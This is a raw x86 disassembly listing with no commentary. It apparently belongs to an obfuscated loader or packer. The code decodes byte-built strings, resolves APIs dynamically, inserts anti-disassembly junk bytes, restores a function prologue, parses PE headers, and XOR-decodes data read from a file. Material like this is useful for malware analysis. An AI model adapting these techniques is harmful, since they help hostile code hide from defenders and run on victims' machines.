 10046c4:	80 a5 48 f9 ff ff 00 	andb   $0x0,-0x6b8(%ebp)
 10046cb:	80 a5 49 f9 ff ff 00 	andb   $0x0,-0x6b7(%ebp)
 10046d2:	c6 85 4a f9 ff ff 9b 	movb   $0x9b,-0x6b6(%ebp)
 10046d9:	80 a5 4b f9 ff ff 00 	andb   $0x0,-0x6b5(%ebp)
 10046e0:	c6 85 4c f9 ff ff 33 	movb   $0x33,-0x6b4(%ebp)
 10046e7:	c6 85 4d f9 ff ff 16 	movb   $0x16,-0x6b3(%ebp)
 10046ee:	c6 85 4e f9 ff ff 0d 	movb   $0xd,-0x6b2(%ebp)
 10046f5:	c6 85 4f f9 ff ff 10 	movb   $0x10,-0x6b1(%ebp)
 10046fc:	c6 85 50 f9 ff ff 01 	movb   $0x1,-0x6b0(%ebp)
 1004703:	c6 85 51 f9 ff ff 34 	movb   $0x34,-0x6af(%ebp)
 100470a:	c6 85 52 f9 ff ff 16 	movb   $0x16,-0x6ae(%ebp)
 1004711:	c6 85 53 f9 ff ff 0b 	movb   $0xb,-0x6ad(%ebp)
 1004718:	c6 85 54 f9 ff ff 07 	movb   $0x7,-0x6ac(%ebp)
 100471f:	c6 85 55 f9 ff ff 01 	movb   $0x1,-0x6ab(%ebp)
 1004726:	c6 85 56 f9 ff ff 17 	movb   $0x17,-0x6aa(%ebp)
 100472d:	c6 85 57 f9 ff ff 17 	movb   $0x17,-0x6a9(%ebp)
 1004734:	c6 85 58 f9 ff ff 29 	movb   $0x29,-0x6a8(%ebp)
 100473b:	c6 85 59 f9 ff ff 01 	movb   $0x1,-0x6a7(%ebp)
 1004742:	c6 85 5a f9 ff ff 09 	movb   $0x9,-0x6a6(%ebp)
 1004749:	c6 85 5b f9 ff ff 0b 	movb   $0xb,-0x6a5(%ebp)
 1004750:	c6 85 5c f9 ff ff 16 	movb   $0x16,-0x6a4(%ebp)
 1004757:	c6 85 5d f9 ff ff 1d 	movb   $0x1d,-0x6a3(%ebp)
 100475e:	c6 85 5e f9 ff ff 64 	movb   $0x64,-0x6a2(%ebp)
 1004765:	8d 85 48 f9 ff ff    	lea    -0x6b8(%ebp),%eax
 100476b:	50                   	push   %eax
 100476c:	e8 65 f2 ff ff       	call   0x10039d6
 1004771:	59                   	pop    %ecx
 1004772:	50                   	push   %eax
 1004773:	ff 75 18             	push   0x18(%ebp)
 1004776:	ff 75 14             	push   0x14(%ebp)
 1004779:	e8 0d f2 ff ff       	call   0x100398b
 100477e:	83 c4 0c             	add    $0xc,%esp
 1004781:	89 85 70 f9 ff ff    	mov    %eax,-0x690(%ebp)
 1004787:	c6 85 60 f9 ff ff 8b 	movb   $0x8b,-0x6a0(%ebp)
 100478e:	80 8d 61 f9 ff ff ff 	orb    $0xff,-0x69f(%ebp)
 1004795:	c6 85 62 f9 ff ff 55 	movb   $0x55,-0x69e(%ebp)
 100479c:	c6 85 63 f9 ff ff 8b 	movb   $0x8b,-0x69d(%ebp)
 10047a3:	c6 85 64 f9 ff ff ec 	movb   $0xec,-0x69c(%ebp)
 10047aa:	8d 85 6c f9 ff ff    	lea    -0x694(%ebp),%eax
 10047b0:	50                   	push   %eax
 10047b1:	6a 05                	push   $0x5
 10047b3:	8d 85 60 f9 ff ff    	lea    -0x6a0(%ebp),%eax
 10047b9:	50                   	push   %eax
 10047ba:	ff b5 c4 fc ff ff    	push   -0x33c(%ebp)
 10047c0:	6a ff                	push   $0xffffffff
 10047c2:	ff 95 70 f9 ff ff    	call   *-0x690(%ebp)
 10047c8:	8b 45 08             	mov    0x8(%ebp),%eax
 10047cb:	89 85 40 f9 ff ff    	mov    %eax,-0x6c0(%ebp)
 10047d1:	8b 45 10             	mov    0x10(%ebp),%eax
 10047d4:	89 85 44 f9 ff ff    	mov    %eax,-0x6bc(%ebp)
 10047da:	68 00 10 00 00       	push   $0x1000
 10047df:	6a 08                	push   $0x8
 10047e1:	ff b5 8c f9 ff ff    	push   -0x674(%ebp)
 10047e7:	ff 95 84 f9 ff ff    	call   *-0x67c(%ebp)
 10047ed:	89 85 68 f9 ff ff    	mov    %eax,-0x698(%ebp)
 10047f3:	e8 ce f1 ff ff       	call   0x10039c6
 10047f8:	b2 ca                	mov    $0xca,%dl
 10047fa:	f6 07 ff             	testb  $0xff,(%edi)
 10047fd:	b5 68                	mov    $0x68,%ch
 10047ff:	f9                   	stc
 1004800:	ff                   	(bad)
 1004801:	ff 8d 85 40 f9 ff    	decl   -0x6bf7b(%ebp)
 1004807:	ff 50 ff             	call   *-0x1(%eax)
 100480a:	75 08                	jne    0x1004814
 100480c:	ff 75 18             	push   0x18(%ebp)
 100480f:	ff 75 14             	push   0x14(%ebp)
 1004812:	e8 8b f3 ff ff       	call   0x1003ba2
 1004817:	83 c4 14             	add    $0x14,%esp
 100481a:	e8 a7 f1 ff ff       	call   0x10039c6
 100481f:	0a d4                	or     %ah,%dl
 1004821:	6e                   	outsb  %ds:(%esi),(%dx)
 1004822:	9f                   	lahf
 1004823:	ff b5 68 f9 ff ff    	push   -0x698(%ebp)
 1004829:	6a 01                	push   $0x1
 100482b:	ff b5 8c f9 ff ff    	push   -0x674(%ebp)
 1004831:	ff 95 64 fc ff ff    	call   *-0x39c(%ebp)
 1004837:	8b 85 c4 fc ff ff    	mov    -0x33c(%ebp),%eax
 100483d:	8b 65 1c             	mov    0x1c(%ebp),%esp
 1004840:	89 44 24 fc          	mov    %eax,-0x4(%esp)
 1004844:	61                   	popa
 1004845:	83 c4 14             	add    $0x14,%esp
 1004848:	ff 64 24 c8          	jmp    *-0x38(%esp)
 100484c:	e8 75 f1 ff ff       	call   0x10039c6
 1004851:	0e                   	push   %cs
 1004852:	81 66 50 80 a5 bc fa 	andl   $0xfabca580,0x50(%esi)
 1004859:	ff                   	(bad)
 100485a:	ff 00                	incl   (%eax)
 100485c:	6a 00                	push   $0x0
 100485e:	ff 95 c0 fc ff ff    	call   *-0x340(%ebp)
 1004864:	89 45 08             	mov    %eax,0x8(%ebp)
 1004867:	68 04 01 00 00       	push   $0x104
 100486c:	8d 85 cc fc ff ff    	lea    -0x334(%ebp),%eax
 1004872:	50                   	push   %eax
 1004873:	6a 00                	push   $0x0
 1004875:	ff 95 c8 fa ff ff    	call   *-0x538(%ebp)
 100487b:	e8 46 f1 ff ff       	call   0x10039c6
 1004880:	87 85 57 b0 80 a5    	xchg   %eax,-0x5a7f4fa9(%ebp)
 1004886:	d0 fd                	sar    $1,%ch
 1004888:	ff                   	(bad)
 1004889:	ff 00                	incl   (%eax)
 100488b:	6a 40                	push   $0x40
 100488d:	59                   	pop    %ecx
 100488e:	33 c0                	xor    %eax,%eax
 1004890:	8d bd d1 fd ff ff    	lea    -0x22f(%ebp),%edi
 1004896:	f3 ab                	rep stos %eax,%es:(%edi)
 1004898:	66 ab                	stos   %ax,%es:(%edi)
 100489a:	aa                   	stos   %al,%es:(%edi)
 100489b:	80 a5 d4 fe ff ff 00 	andb   $0x0,-0x12c(%ebp)
 10048a2:	6a 40                	push   $0x40
 10048a4:	59                   	pop    %ecx
 10048a5:	33 c0                	xor    %eax,%eax
 10048a7:	8d bd d5 fe ff ff    	lea    -0x12b(%ebp),%edi
 10048ad:	f3 ab                	rep stos %eax,%es:(%edi)
 10048af:	66 ab                	stos   %ax,%es:(%edi)
 10048b1:	aa                   	stos   %al,%es:(%edi)
 10048b2:	80 a5 ac f9 ff ff 00 	andb   $0x0,-0x654(%ebp)
 10048b9:	6a 40                	push   $0x40
 10048bb:	59                   	pop    %ecx
 10048bc:	33 c0                	xor    %eax,%eax
 10048be:	8d bd ad f9 ff ff    	lea    -0x653(%ebp),%edi
 10048c4:	f3 ab                	rep stos %eax,%es:(%edi)
 10048c6:	66 ab                	stos   %ax,%es:(%edi)
 10048c8:	aa                   	stos   %al,%es:(%edi)
 10048c9:	80 a5 fc fa ff ff 00 	andb   $0x0,-0x504(%ebp)
 10048d0:	6a 40                	push   $0x40
 10048d2:	59                   	pop    %ecx
 10048d3:	33 c0                	xor    %eax,%eax
 10048d5:	8d bd fd fa ff ff    	lea    -0x503(%ebp),%edi
 10048db:	f3 ab                	rep stos %eax,%es:(%edi)
 10048dd:	66 ab                	stos   %ax,%es:(%edi)
 10048df:	aa                   	stos   %al,%es:(%edi)
 10048e0:	e8 bf f0 ff ff       	call   0x10039a4
 10048e5:	08 a0 c6 45 f8 2f    	or     %ah,0x2ff845c6(%eax)
 10048eb:	c6 45 dc 34          	movb   $0x34,-0x24(%ebp)
 10048ef:	80 a5 94 fc ff ff 00 	andb   $0x0,-0x36c(%ebp)
 10048f6:	80 a5 95 fc ff ff 00 	andb   $0x0,-0x36b(%ebp)
 10048fd:	c6 85 96 fc ff ff aa 	movb   $0xaa,-0x36a(%ebp)
 1004904:	80 a5 97 fc ff ff 00 	andb   $0x0,-0x369(%ebp)
 100490b:	c6 85 98 fc ff ff 12 	movb   $0x12,-0x368(%ebp)
 1004912:	c6 85 99 fc ff ff 30 	movb   $0x30,-0x367(%ebp)
 1004919:	c6 85 9a fc ff ff 21 	movb   $0x21,-0x366(%ebp)
 1004920:	c6 85 9b fc ff ff 06 	movb   $0x6,-0x365(%ebp)
 1004927:	c6 85 9c fc ff ff 2c 	movb   $0x2c,-0x364(%ebp)
 100492e:	c6 85 9d fc ff ff 26 	movb   $0x26,-0x363(%ebp)
 1004935:	c6 85 9e fc ff ff 21 	movb   $0x21,-0x362(%ebp)
 100493c:	c6 85 9f fc ff ff 30 	movb   $0x30,-0x361(%ebp)
 1004943:	c6 85 a0 fc ff ff 38 	movb   $0x38,-0x360(%ebp)
 100494a:	c6 85 a1 fc ff ff 11 	movb   $0x11,-0x35f(%ebp)
 1004951:	c6 85 a2 fc ff ff 3c 	movb   $0x3c,-0x35e(%ebp)
 1004958:	c6 85 a3 fc ff ff 27 	movb   $0x27,-0x35d(%ebp)
 100495f:	c6 85 a4 fc ff ff 30 	movb   $0x30,-0x35c(%ebp)
 1004966:	c6 85 a5 fc ff ff 36 	movb   $0x36,-0x35b(%ebp)
 100496d:	c6 85 a6 fc ff ff 21 	movb   $0x21,-0x35a(%ebp)
 1004974:	c6 85 a7 fc ff ff 3a 	movb   $0x3a,-0x359(%ebp)
 100497b:	c6 85 a8 fc ff ff 27 	movb   $0x27,-0x358(%ebp)
 1004982:	c6 85 a9 fc ff ff 2c 	movb   $0x2c,-0x357(%ebp)
 1004989:	c6 85 aa fc ff ff 14 	movb   $0x14,-0x356(%ebp)
 1004990:	c6 85 ab fc ff ff 55 	movb   $0x55,-0x355(%ebp)
 1004997:	8d 85 94 fc ff ff    	lea    -0x36c(%ebp),%eax
 100499d:	50                   	push   %eax
 100499e:	e8 33 f0 ff ff       	call   0x10039d6
 10049a3:	59                   	pop    %ecx
 10049a4:	50                   	push   %eax
 10049a5:	ff 75 18             	push   0x18(%ebp)
 10049a8:	ff 75 14             	push   0x14(%ebp)
 10049ab:	e8 db ef ff ff       	call   0x100398b
 10049b0:	83 c4 0c             	add    $0xc,%esp
 10049b3:	89 85 2c fc ff ff    	mov    %eax,-0x3d4(%ebp)
 10049b9:	e8 08 f0 ff ff       	call   0x10039c6
 10049be:	e0 50                	loopne 0x1004a10
 10049c0:	9d                   	popf
 10049c1:	59                   	pop    %ecx
 10049c2:	68 04 01 00 00       	push   $0x104
 10049c7:	8d 85 d4 fe ff ff    	lea    -0x12c(%ebp),%eax
 10049cd:	50                   	push   %eax
 10049ce:	ff 95 2c fc ff ff    	call   *-0x3d4(%ebp)
 10049d4:	89 45 d8             	mov    %eax,-0x28(%ebp)
 10049d7:	e8 ea ef ff ff       	call   0x10039c6
 10049dc:	05 41 fc ab 80       	add    $0x80abfc41,%eax
 10049e1:	65 e0 00             	gs loopne 0x10049e4
 10049e4:	80 65 e1 00          	andb   $0x0,-0x1f(%ebp)
 10049e8:	c6 45 e2 1d          	movb   $0x1d,-0x1e(%ebp)
 10049ec:	80 65 e3 00          	andb   $0x0,-0x1d(%ebp)
 10049f0:	c6 45 e4 a5          	movb   $0xa5,-0x1c(%ebp)
 10049f4:	c6 45 e5 87          	movb   $0x87,-0x1b(%ebp)
 10049f8:	c6 45 e6 96          	movb   $0x96,-0x1a(%ebp)
 10049fc:	c6 45 e7 b6          	movb   $0xb6,-0x19(%ebp)
 1004a00:	c6 45 e8 87          	movb   $0x87,-0x18(%ebp)
 1004a04:	c6 45 e9 8f          	movb   $0x8f,-0x17(%ebp)
 1004a08:	c6 45 ea 92          	movb   $0x92,-0x16(%ebp)
 1004a0c:	c6 45 eb b2          	movb   $0xb2,-0x15(%ebp)
 1004a10:	c6 45 ec 83          	movb   $0x83,-0x14(%ebp)
 1004a14:	c6 45 ed 96          	movb   $0x96,-0x13(%ebp)
 1004a18:	c6 45 ee 8a          	movb   $0x8a,-0x12(%ebp)
 1004a1c:	c6 45 ef a3          	movb   $0xa3,-0x11(%ebp)
 1004a20:	c6 45 f0 e2          	movb   $0xe2,-0x10(%ebp)
 1004a24:	8d 45 e0             	lea    -0x20(%ebp),%eax
 1004a27:	50                   	push   %eax
 1004a28:	e8 a9 ef ff ff       	call   0x10039d6
 1004a2d:	59                   	pop    %ecx
 1004a2e:	50                   	push   %eax
 1004a2f:	ff 75 18             	push   0x18(%ebp)
 1004a32:	ff 75 14             	push   0x14(%ebp)
 1004a35:	e8 51 ef ff ff       	call   0x100398b
 1004a3a:	83 c4 0c             	add    $0xc,%esp
 1004a3d:	89 85 90 fc ff ff    	mov    %eax,-0x370(%ebp)
 1004a43:	8d 85 ac f9 ff ff    	lea    -0x654(%ebp),%eax
 1004a49:	50                   	push   %eax
 1004a4a:	68 04 01 00 00       	push   $0x104
 1004a4f:	ff 95 90 fc ff ff    	call   *-0x370(%ebp)
 1004a55:	89 85 b0 fa ff ff    	mov    %eax,-0x550(%ebp)
 1004a5b:	8b 45 d8             	mov    -0x28(%ebp),%eax
 1004a5e:	0f be 84 05 d3 fe ff 	movsbl -0x12d(%ebp,%eax,1),%eax
 1004a65:	ff 
 1004a66:	83 f8 5c             	cmp    $0x5c,%eax
 1004a69:	75 07                	jne    0x1004a72
 1004a6b:	8b 45 d8             	mov    -0x28(%ebp),%eax
 1004a6e:	48                   	dec    %eax
 1004a6f:	89 45 d8             	mov    %eax,-0x28(%ebp)
 1004a72:	8b 85 b0 fa ff ff    	mov    -0x550(%ebp),%eax
 1004a78:	0f be 84 05 ab f9 ff 	movsbl -0x655(%ebp,%eax,1),%eax
 1004a7f:	ff 
 1004a80:	83 f8 5c             	cmp    $0x5c,%eax
 1004a83:	75 0d                	jne    0x1004a92
 1004a85:	8b 85 b0 fa ff ff    	mov    -0x550(%ebp),%eax
 1004a8b:	48                   	dec    %eax
 1004a8c:	89 85 b0 fa ff ff    	mov    %eax,-0x550(%ebp)
 1004a92:	83 a5 c8 fc ff ff 00 	andl   $0x0,-0x338(%ebp)
 1004a99:	83 a5 30 fc ff ff 00 	andl   $0x0,-0x3d0(%ebp)
 1004aa0:	eb 0d                	jmp    0x1004aaf
 1004aa2:	8b 85 30 fc ff ff    	mov    -0x3d0(%ebp),%eax
 1004aa8:	40                   	inc    %eax
 1004aa9:	89 85 30 fc ff ff    	mov    %eax,-0x3d0(%ebp)
 1004aaf:	81 bd 30 fc ff ff 04 	cmpl   $0x104,-0x3d0(%ebp)
 1004ab6:	01 00 00 
 1004ab9:	7d 5b                	jge    0x1004b16
 1004abb:	8b 85 30 fc ff ff    	mov    -0x3d0(%ebp),%eax
 1004ac1:	0f be 84 05 cc fc ff 	movsbl -0x334(%ebp,%eax,1),%eax
 1004ac8:	ff 
 1004ac9:	25 80 00 00 00       	and    $0x80,%eax
 1004ace:	85 c0                	test   %eax,%eax
 1004ad0:	74 0f                	je     0x1004ae1
 1004ad2:	8b 85 30 fc ff ff    	mov    -0x3d0(%ebp),%eax
 1004ad8:	40                   	inc    %eax
 1004ad9:	89 85 30 fc ff ff    	mov    %eax,-0x3d0(%ebp)
 1004adf:	eb 33                	jmp    0x1004b14
 1004ae1:	8b 85 30 fc ff ff    	mov    -0x3d0(%ebp),%eax
 1004ae7:	0f be 84 05 cc fc ff 	movsbl -0x334(%ebp,%eax,1),%eax
 1004aee:	ff 
 1004aef:	83 f8 5c             	cmp    $0x5c,%eax
 1004af2:	75 0c                	jne    0x1004b00
 1004af4:	8b 85 30 fc ff ff    	mov    -0x3d0(%ebp),%eax
 1004afa:	89 85 c8 fc ff ff    	mov    %eax,-0x338(%ebp)
 1004b00:	8b 85 30 fc ff ff    	mov    -0x3d0(%ebp),%eax
 1004b06:	0f be 84 05 cc fc ff 	movsbl -0x334(%ebp,%eax,1),%eax
 1004b0d:	ff 
 1004b0e:	85 c0                	test   %eax,%eax
 1004b10:	75 02                	jne    0x1004b14
 1004b12:	eb 02                	jmp    0x1004b16
 1004b14:	eb 8c                	jmp    0x1004aa2
 1004b16:	8b 85 90 f9 ff ff    	mov    -0x670(%ebp),%eax
 1004b1c:	03 85 7c fc ff ff    	add    -0x384(%ebp),%eax
 1004b22:	89 85 90 f9 ff ff    	mov    %eax,-0x670(%ebp)
 1004b28:	8b 85 90 f9 ff ff    	mov    -0x670(%ebp),%eax
 1004b2e:	40                   	inc    %eax
 1004b2f:	89 85 90 f9 ff ff    	mov    %eax,-0x670(%ebp)
 1004b35:	ff b5 c8 fc ff ff    	push   -0x338(%ebp)
 1004b3b:	8d 85 cc fc ff ff    	lea    -0x334(%ebp),%eax
 1004b41:	50                   	push   %eax
 1004b42:	8d 85 d0 fd ff ff    	lea    -0x230(%ebp),%eax
 1004b48:	50                   	push   %eax
 1004b49:	e8 e9 ed ff ff       	call   0x1003937
 1004b4e:	83 c4 0c             	add    $0xc,%esp
 1004b51:	8b 85 90 f9 ff ff    	mov    -0x670(%ebp),%eax
 1004b57:	40                   	inc    %eax
 1004b58:	89 85 90 f9 ff ff    	mov    %eax,-0x670(%ebp)
 1004b5e:	8b 85 90 f9 ff ff    	mov    -0x670(%ebp),%eax
 1004b64:	40                   	inc    %eax
 1004b65:	89 85 90 f9 ff ff    	mov    %eax,-0x670(%ebp)
 1004b6b:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
 1004b6f:	83 a5 60 fc ff ff 00 	andl   $0x0,-0x3a0(%ebp)
 1004b76:	83 a5 84 fc ff ff 00 	andl   $0x0,-0x37c(%ebp)
 1004b7d:	83 a5 78 fc ff ff 00 	andl   $0x0,-0x388(%ebp)
 1004b84:	83 a5 8c fc ff ff 00 	andl   $0x0,-0x374(%ebp)
 1004b8b:	8a 45 f8             	mov    -0x8(%ebp),%al
 1004b8e:	02 85 90 f9 ff ff    	add    -0x670(%ebp),%al
 1004b94:	88 45 f8             	mov    %al,-0x8(%ebp)
 1004b97:	8b 45 08             	mov    0x8(%ebp),%eax
 1004b9a:	89 85 b8 fa ff ff    	mov    %eax,-0x548(%ebp)
 1004ba0:	8b 85 b8 fa ff ff    	mov    -0x548(%ebp),%eax
 1004ba6:	8b 8d b8 fa ff ff    	mov    -0x548(%ebp),%ecx
 1004bac:	03 48 3c             	add    0x3c(%eax),%ecx
 1004baf:	89 8d c4 fa ff ff    	mov    %ecx,-0x53c(%ebp)
 1004bb5:	8b 85 c4 fa ff ff    	mov    -0x53c(%ebp),%eax
 1004bbb:	8b 4d 08             	mov    0x8(%ebp),%ecx
 1004bbe:	03 48 28             	add    0x28(%eax),%ecx
 1004bc1:	89 8d 58 fc ff ff    	mov    %ecx,-0x3a8(%ebp)
 1004bc7:	8a 45 dc             	mov    -0x24(%ebp),%al
 1004bca:	2a 85 90 f9 ff ff    	sub    -0x670(%ebp),%al
 1004bd0:	88 45 dc             	mov    %al,-0x24(%ebp)
 1004bd3:	e8 cc ed ff ff       	call   0x10039a4
 1004bd8:	ba a9 80 a5 04       	mov    $0x4a580a9,%edx
 1004bdd:	fc                   	cld
 1004bde:	ff                   	(bad)
 1004bdf:	ff 00                	incl   (%eax)
 1004be1:	80 a5 05 fc ff ff 00 	andb   $0x0,-0x3fb(%ebp)
 1004be8:	c6 85 06 fc ff ff 0e 	movb   $0xe,-0x3fa(%ebp)
 1004bef:	80 a5 07 fc ff ff 00 	andb   $0x0,-0x3f9(%ebp)
 1004bf6:	c6 85 08 fc ff ff b2 	movb   $0xb2,-0x3f8(%ebp)
 1004bfd:	c6 85 09 fc ff ff 83 	movb   $0x83,-0x3f7(%ebp)
 1004c04:	c6 85 0a fc ff ff 94 	movb   $0x94,-0x3f6(%ebp)
 1004c0b:	c6 85 0b fc ff ff 90 	movb   $0x90,-0x3f5(%ebp)
 1004c12:	c6 85 0c fc ff ff 85 	movb   $0x85,-0x3f4(%ebp)
 1004c19:	c6 85 0d fc ff ff 94 	movb   $0x94,-0x3f3(%ebp)
 1004c20:	c6 85 0e fc ff ff b7 	movb   $0xb7,-0x3f2(%ebp)
 1004c27:	c6 85 0f fc ff ff 98 	movb   $0x98,-0x3f1(%ebp)
 1004c2e:	c6 85 10 fc ff ff 9d 	movb   $0x9d,-0x3f0(%ebp)
 1004c35:	c6 85 11 fc ff ff 94 	movb   $0x94,-0x3ef(%ebp)
 1004c3c:	c6 85 12 fc ff ff b0 	movb   $0xb0,-0x3ee(%ebp)
 1004c43:	c6 85 13 fc ff ff f1 	movb   $0xf1,-0x3ed(%ebp)
 1004c4a:	e8 77 ed ff ff       	call   0x10039c6
 1004c4f:	1c c5                	sbb    $0xc5,%al
 1004c51:	4b                   	dec    %ebx
 1004c52:	91                   	xchg   %eax,%ecx
 1004c53:	8d 85 04 fc ff ff    	lea    -0x3fc(%ebp),%eax
 1004c59:	50                   	push   %eax
 1004c5a:	e8 77 ed ff ff       	call   0x10039d6
 1004c5f:	59                   	pop    %ecx
 1004c60:	50                   	push   %eax
 1004c61:	ff 75 18             	push   0x18(%ebp)
 1004c64:	ff 75 14             	push   0x14(%ebp)
 1004c67:	e8 1f ed ff ff       	call   0x100398b
 1004c6c:	83 c4 0c             	add    $0xc,%esp
 1004c6f:	89 85 38 fc ff ff    	mov    %eax,-0x3c8(%ebp)
 1004c75:	6a 00                	push   $0x0
 1004c77:	68 80 00 00 00       	push   $0x80
 1004c7c:	6a 03                	push   $0x3
 1004c7e:	6a 00                	push   $0x0
 1004c80:	6a 01                	push   $0x1
 1004c82:	68 00 00 00 80       	push   $0x80000000
 1004c87:	8d 85 cc fc ff ff    	lea    -0x334(%ebp),%eax
 1004c8d:	50                   	push   %eax
 1004c8e:	ff 95 38 fc ff ff    	call   *-0x3c8(%ebp)
 1004c94:	89 85 94 f9 ff ff    	mov    %eax,-0x66c(%ebp)
 1004c9a:	83 bd 94 f9 ff ff ff 	cmpl   $0xffffffff,-0x66c(%ebp)
 1004ca1:	0f 84 b2 0e 00 00    	je     0x1005b59
 1004ca7:	6a 00                	push   $0x0
 1004ca9:	ff b5 94 f9 ff ff    	push   -0x66c(%ebp)
 1004caf:	ff 95 c4 fc ff ff    	call   *-0x33c(%ebp)
 1004cb5:	89 85 88 fc ff ff    	mov    %eax,-0x378(%ebp)
 1004cbb:	ff b5 88 fc ff ff    	push   -0x378(%ebp)
 1004cc1:	6a 08                	push   $0x8
 1004cc3:	ff b5 8c f9 ff ff    	push   -0x674(%ebp)
 1004cc9:	ff 95 84 f9 ff ff    	call   *-0x67c(%ebp)
 1004ccf:	89 45 fc             	mov    %eax,-0x4(%ebp)
 1004cd2:	e8 ef ec ff ff       	call   0x10039c6
 1004cd7:	d1 4a a4             	rorl   $1,-0x5c(%edx)
 1004cda:	45                   	inc    %ebp
 1004cdb:	80 a5 24 f9 ff ff 00 	andb   $0x0,-0x6dc(%ebp)
 1004ce2:	80 a5 25 f9 ff ff 00 	andb   $0x0,-0x6db(%ebp)
 1004ce9:	c6 85 26 f9 ff ff 2c 	movb   $0x2c,-0x6da(%ebp)
 1004cf0:	80 a5 27 f9 ff ff 00 	andb   $0x0,-0x6d9(%ebp)
 1004cf7:	c6 85 28 f9 ff ff 81 	movb   $0x81,-0x6d8(%ebp)
 1004cfe:	c6 85 29 f9 ff ff b6 	movb   $0xb6,-0x6d7(%ebp)
 1004d05:	c6 85 2a f9 ff ff b2 	movb   $0xb2,-0x6d6(%ebp)
 1004d0c:	c6 85 2b f9 ff ff b7 	movb   $0xb7,-0x6d5(%ebp)
 1004d13:	c6 85 2c f9 ff ff 95 	movb   $0x95,-0x6d4(%ebp)
 1004d1a:	c6 85 2d f9 ff ff ba 	movb   $0xba,-0x6d3(%ebp)
 1004d21:	c6 85 2e f9 ff ff bf 	movb   $0xbf,-0x6d2(%ebp)
 1004d28:	c6 85 2f f9 ff ff b6 	movb   $0xb6,-0x6d1(%ebp)
 1004d2f:	c6 85 30 f9 ff ff d3 	movb   $0xd3,-0x6d0(%ebp)
 1004d36:	e8 8b ec ff ff       	call   0x10039c6
 1004d3b:	21 31                	and    %esi,(%ecx)
 1004d3d:	a9 cf 8d 85 24       	test   $0x24858dcf,%eax
 1004d42:	f9                   	stc
 1004d43:	ff                   	(bad)
 1004d44:	ff 50 e8             	call   *-0x18(%eax)
 1004d47:	8b ec                	mov    %esp,%ebp
 1004d49:	ff                   	(bad)
 1004d4a:	ff 59 50             	lcall  *0x50(%ecx)
 1004d4d:	ff 75 18             	push   0x18(%ebp)
 1004d50:	ff 75 14             	push   0x14(%ebp)
 1004d53:	e8 33 ec ff ff       	call   0x100398b
 1004d58:	83 c4 0c             	add    $0xc,%esp
 1004d5b:	89 85 38 f9 ff ff    	mov    %eax,-0x6c8(%ebp)
 1004d61:	6a 00                	push   $0x0
 1004d63:	8d 85 20 f9 ff ff    	lea    -0x6e0(%ebp),%eax
 1004d69:	50                   	push   %eax
 1004d6a:	ff b5 88 fc ff ff    	push   -0x378(%ebp)
 1004d70:	ff 75 fc             	push   -0x4(%ebp)
 1004d73:	ff b5 94 f9 ff ff    	push   -0x66c(%ebp)
 1004d79:	ff 95 38 f9 ff ff    	call   *-0x6c8(%ebp)
 1004d7f:	89 85 34 f9 ff ff    	mov    %eax,-0x6cc(%ebp)
 1004d85:	ff b5 94 f9 ff ff    	push   -0x66c(%ebp)
 1004d8b:	ff 95 80 f9 ff ff    	call   *-0x680(%ebp)
 1004d91:	83 bd 34 f9 ff ff 00 	cmpl   $0x0,-0x6cc(%ebp)
 1004d98:	0f 84 bb 0d 00 00    	je     0x1005b59
 1004d9e:	6a 05                	push   $0x5
 1004da0:	8b 85 88 fc ff ff    	mov    -0x378(%ebp),%eax
 1004da6:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 1004da9:	8d 44 01 e3          	lea    -0x1d(%ecx,%eax,1),%eax
 1004dad:	50                   	push   %eax
 1004dae:	8d 85 6c fc ff ff    	lea    -0x394(%ebp),%eax
 1004db4:	50                   	push   %eax
 1004db5:	e8 7d eb ff ff       	call   0x1003937
 1004dba:	83 c4 0c             	add    $0xc,%esp
 1004dbd:	83 a5 00 f9 ff ff 00 	andl   $0x0,-0x700(%ebp)
 1004dc4:	eb 0d                	jmp    0x1004dd3
 1004dc6:	8b 85 00 f9 ff ff    	mov    -0x700(%ebp),%eax
 1004dcc:	40                   	inc    %eax
 1004dcd:	89 85 00 f9 ff ff    	mov    %eax,-0x700(%ebp)
 1004dd3:	83 bd 00 f9 ff ff 05 	cmpl   $0x5,-0x700(%ebp)
 1004dda:	7d 40                	jge    0x1004e1c
 1004ddc:	8b 85 00 f9 ff ff    	mov    -0x700(%ebp),%eax
 1004de2:	0f be 84 05 6c fc ff 	movsbl -0x394(%ebp,%eax,1),%eax
 1004de9:	ff 
 1004dea:	0f be 4d dc          	movsbl -0x24(%ebp),%ecx
 1004dee:	33 c1                	xor    %ecx,%eax
 1004df0:	8b 8d 00 f9 ff ff    	mov    -0x700(%ebp),%ecx
 1004df6:	88 84 0d 6c fc ff ff 	mov    %al,-0x394(%ebp,%ecx,1)
 1004dfd:	8b 85 00 f9 ff ff    	mov    -0x700(%ebp),%eax
 1004e03:	0f be 84 05 6c fc ff 	movsbl -0x394(%ebp,%eax,1),%eax
 1004e0a:	ff 
 1004e0b:	f7 d0                	not    %eax
 1004e0d:	8b 8d 00 f9 ff ff    	mov    -0x700(%ebp),%ecx
 1004e13:	88 84 0d 6c fc ff ff 	mov    %al,-0x394(%ebp,%ecx,1)
 1004e1a:	eb aa                	jmp    0x1004dc6
 1004e1c:	e8 a5 eb ff ff       	call   0x10039c6
 1004e21:	58                   	pop    %eax
 1004e22:	17                   	pop    %ss
 1004e23:	b3 d6                	mov    $0xd6,%bl
 1004e25:	80 a5 d4 f8 ff ff 00 	andb   $0x0,-0x72c(%ebp)
 1004e2c:	80 a5 d5 f8 ff ff 00 	andb   $0x0,-0x72b(%ebp)
 1004e33:	c6 85 d6 f8 ff ff c2 	movb   $0xc2,-0x72a(%ebp)
 1004e3a:	80 a5 d7 f8 ff ff 00 	andb   $0x0,-0x729(%ebp)
 1004e41:	c6 85 d8 f8 ff ff 6b 	movb   $0x6b,-0x728(%ebp)
 1004e48:	c6 85 d9 f8 ff ff 54 	movb   $0x54,-0x727(%ebp)
 1004e4f:	c6 85 da f8 ff ff 4f 	movb   $0x4f,-0x726(%ebp)
 1004e56:	c6 85 db f8 ff ff 49 	movb   $0x49,-0x725(%ebp)
 1004e5d:	c6 85 dc f8 ff ff 48 	movb   $0x48,-0x724(%ebp)
 1004e64:	c6 85 dd f8 ff ff 5c 	movb   $0x5c,-0x723(%ebp)
 1004e6b:	c6 85 de f8 ff ff 51 	movb   $0x51,-0x722(%ebp)
 1004e72:	c6 85 df f8 ff ff 6d 	movb   $0x6d,-0x721(%ebp)
 1004e79:	c6 85 e0 f8 ff ff 4f 	movb   $0x4f,-0x720(%ebp)
 1004e80:	c6 85 e1 f8 ff ff 52 	movb   $0x52,-0x71f(%ebp)
